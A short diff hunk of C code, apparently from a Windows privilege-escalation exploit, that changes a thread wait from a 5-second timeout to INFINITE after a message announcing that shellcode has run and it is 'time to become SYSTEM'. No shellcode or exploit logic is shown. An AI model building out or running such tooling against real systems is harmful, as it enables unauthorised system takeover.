@@ -85,7 +85,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 	printf("[i] Your shellcode has been executed with success ! Now, time to become SYSTEM =)\n");
-	WaitForSingleObject(hThread, 5000);
+	WaitForSingleObject(hThread, INFINITE);
 
 
 
